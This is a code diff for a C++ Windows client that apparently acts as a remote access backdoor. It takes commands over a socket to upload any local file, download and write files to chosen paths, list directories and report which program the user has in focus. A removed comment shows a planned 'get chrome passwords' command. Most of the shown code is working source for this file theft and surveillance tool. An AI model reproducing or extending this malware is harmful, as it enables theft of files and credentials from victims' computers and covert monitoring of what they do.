@@ -37,20 +37,43 @@ int Connection::boot() {
     return 0;
 }
 
+
+string Connection::getProcessName(int pid) {
+    HANDLE hProcess = ::OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    if (!hProcess) {
+        cerr << "Cant open handle to the process" << endl;
+        return CANT_OPEN_HANDLE;
+    }
+    TCHAR szProcessName[MAX_PATH]; //Buffer of that holds the process name
+    GetModuleBaseNameA(hProcess, NULL, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
+    CloseHandle(hProcess);
+    cout << szProcessName << endl;
+    return szProcessName;
+}
+
+
+string Connection::getFocusWindowName() {
+    HWND hWindow = ::GetForegroundWindow(); //Get HWND to the focus window
+    DWORD pid;
+    ::GetWindowThreadProcessId(hWindow, &pid);
+    CloseHandle(hWindow);
+    return getProcessName(pid);
+}
+
+
 void Connection::sendMessage(const char *data) {
     send(sock, data, strlen(data), 0);
 }
 
 
 void Connection::sendFile(string path) {
-    //ifstream file{path, ifstream::binary};
-    //unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BUFFER_SIZE + 1, 0);
     HANDLE hFile = ::CreateFileA(path.c_str(),
                                  GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
                                  FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        sendMessage("Cant open the file");
-        cout << "Cant open the file" << endl;
+        //sendMessage("Cant open the file");
+        sendMessage(CANT_OPEN_FILE);
+        cout << "ERROR " << CANT_OPEN_FILE << " Cant open the file" << endl;
         return;
     }
     vector<char> buffer(BUFFER_SIZE + 1, 0);
@@ -58,7 +81,16 @@ void Connection::sendFile(string path) {
     LARGE_INTEGER fileSize;
     int totalReadData = 0;
     ::GetFileSizeEx(hFile, &fileSize);
-    send(sock, to_string(fileSize.QuadPart).c_str(), 15, 0);
+
+    //Adding $ to sizeToSend
+    string sizeToSend = to_string(fileSize.QuadPart);
+    if (sizeToSend.size() < 15) {
+        for (int i = sizeToSend.size(); i < 15; i++) {
+            sizeToSend += "$";
+        }
+    }
+
+    send(sock, sizeToSend.c_str(), 15, 0);
 
     while (bytesRead != 0) {
         ::ReadFile(hFile, buffer.data(), BUFFER_SIZE, &bytesRead, NULL);
@@ -80,12 +112,13 @@ void Connection::recvFile(string path) {
                                  NULL,
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        sendMessage("Cant open the file");
-        cout << "Cant open the file" << endl;
+        sendMessage(CANT_OPEN_FILE);
+        //sendMessage("Cant open the file");
+        cout << "ERROR " << CANT_OPEN_FILE << " Cant open the file" << endl;
         CloseHandle(hFile);
         return;
     }
-
+    sendMessage(HANDLE_WAS_OPENED);
     int totalFileSize = 0;
     recv(sock, buffer.data(), 15, 0);
 
@@ -116,6 +149,7 @@ void Connection::recvFile(string path) {
         cout << totalFileSize << endl;
     }
     CloseHandle(hFile);
+    send(sock, FILE_WAS_SENT, 4, 0);
 }
 
 string Connection::getAllFiles(string path) {
@@ -129,27 +163,6 @@ string Connection::getAllFiles(string path) {
     }
     return files;
 }
-
-//string Connection::readFile(filesystem::path path) {
-//    ifstream file{path.string(), ifstream::binary};
-//    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BUFFER_SIZE + 1, 0);
-//
-//    while (!file.eof()) {
-//        file.read(buffer->data(), BUFFER_SIZE);
-//        send(sock, buffer->data(), static_cast<int>(sizeof(file.gcount())), 0);
-//    }
-//    file.close();
-//    return buffer->data();
-//}
-//
-//void Connection::writeToFile(filesystem::path path, string data) {
-//    ofstream file{path.string(), ofstream::binary};
-//    file.write(data.c_str(), sizeof(data));
-//    file.flush();
-//    file.close();
-//    return;
-//}
-//
 
 string Connection::e1(string &b1) {
     char buffer[128];
@@ -247,30 +260,42 @@ void Connection::connection() {
             command = command.substr(10, command.size() - 1);
             sendFile(command);
             continue;
-        } //else if (!command.rfind("get chrome passwords")) {
-            //getChromePasswords();
-            //continue;
-            // }
-        else if (!command.rfind("send file")) {
+        } else if (!command.rfind("send file")) {
             vector<char> buffer(MAX_PATH + 1, 0);
             recv(sock, buffer.data(), MAX_PATH, 0); //Where to save the file
             cout << "The file path is " << buffer.data() << endl;
             recvFile(buffer.data());
+            continue;
         }
 
 
         if (!command.rfind("get files")) {
             command = command.substr(10, command.size() - 1);
-            string files = getAllFiles(command).c_str();
+            string files = getAllFiles(command);
             cout << files << endl;
-            sendMessage(to_string(files.size()).c_str());
+
+            //Sending the size of the string with all the files names
+
+            string x = to_string(files.size());
+
+            if (x.size() < 20) {
+                for (int i = x.size(); i < 20; i++) {
+                    x += "$";
+                }
+            }
+
+            send(sock, x.c_str(), 20, 0);
+            //send(sock, to_string(files.size()).c_str(), 20, 0);
+            //sendMessage(to_string(files.size()).c_str());
+            cout << files.size() << endl;
             sendMessage(files.c_str());
             continue;
         }
         //The command is not exist
-        string cantFind = "The command " + command + " was not found";
-        sendMessage(cantFind.c_str());
-        cout << sizeof(cantFind.c_str()) << endl;
+        //string cantFind = "The command " + command + " was not found";
+        send(sock, COMMAND_NOT_FOUND, 4, 0);
+        //sendMessage(cantFind.c_str());
+        cout << "The command " << command << " was not found" << endl;
 
     }
 
